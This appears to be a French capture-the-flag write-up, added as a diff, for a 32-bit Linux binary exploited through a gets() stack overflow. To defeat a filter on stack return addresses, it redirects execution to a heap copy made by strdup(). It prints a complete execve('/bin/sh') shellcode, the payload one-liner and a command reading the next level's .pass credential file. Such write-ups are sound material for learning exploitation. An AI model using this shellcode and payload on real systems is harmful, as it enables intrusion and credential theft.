@@ -1,0 +1,48 @@
+Le binaire level2 est un exécutable Linux 32 bits (x86). L'analyse statique révèle une architec	ture classique où la fonction main appelle une fonction vulnérable nommée p().
+
+Données d'allocation (Désassemblage)
+Dans la fonction p(), l'instruction suivante définit la taille du tampon sur la pile :
+0x080484e7 <+19>: lea -0x4c(%ebp), %eax
+0x4c en hexadécimal correspond à 76 octets en décimal.
+Le programme utilise gets(), une fonction qui ne limite pas la saisie, permettant un Stack Buffer Overflow.
+
+Le développeur a intégré un filtre manuel pour empêcher l'exécution de code sur la pile (Stack).
+
+Le Filtre (EIP Check)
+Juste avant l'instruction de retour (ret), le programme vérifie l'adresse de retour (EIP) :
+Logique : (Adresse_Retour & 0xb0000000) == 0xb0000000
+Impact : Si l'adresse commence par 0xb... (adresse typique de la pile), le programme s'arrête.
+La Solution : Le Tas (Heap)
+Le programme appelle strdup() après la lecture de l'entrée. Cette fonction duplique la saisie utilisateur dans le Tas (Heap).
+Les adresses du Tas commencent par 0x08....
+Bypass : 0x0804a008 & 0xb0000000 = 0. Le filtre de sécurité laisse passer l'exécution.
+
+Nous utilisons un shellcode ultra-optimisé pour injecter la commande execve("/bin/sh")(21 OCTETS).
+
+Opcode	Instruction Assembleur	Description Technique
+\x6a\x0b\x58	push 11; pop eax	Charge le Syscall execve (11) dans EAX.
+\x99	cdq	Met EDX à zéro (astuce pour éviter les octets nuls \x00).
+\x52	push edx	Pousse le terminateur de chaîne (0) sur la pile.
+\x68\x2f\x2f\x73\x68	push //sh	Pousse la fin du chemin sur la pile.
+\x68\x2f\x62\x69\x6e	push /bin	Pousse le début du chemin sur la pile.
+\x89\xe3	mov ebx, esp	EBX pointe vers "/bin//sh" (1er argument).
+\x31\xc9	xor ecx, ecx	Met les arguments (argv/envp) à zéro.
+\xcd\x80	int 0x80	Exécute l'appel système Linux.
+
+Pour écraser l'adresse de retour (EIP), nous devons combler la structure de la pile :
+Buffer local : 76 octets.
+Saved EBP : 4 octets.
+TOTAL (Offset) : 80 octets.
+Structure du Payload final
+[ Shellcode (21) ] + [ Padding "A" (59) ] + [ Adresse du Tas (4) ]
+Total : 84 octets.
+Adresse cible : 0x0804a008 (injectée en Little-Endian : \x08\xa0\x04\x08).
+
+L'exploitation nécessite une précision binaire absolue.
+
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload
+
+(cat /tmp/payload; cat) | ./level2
+
+whoami
+cat /home/user/level3/.pass
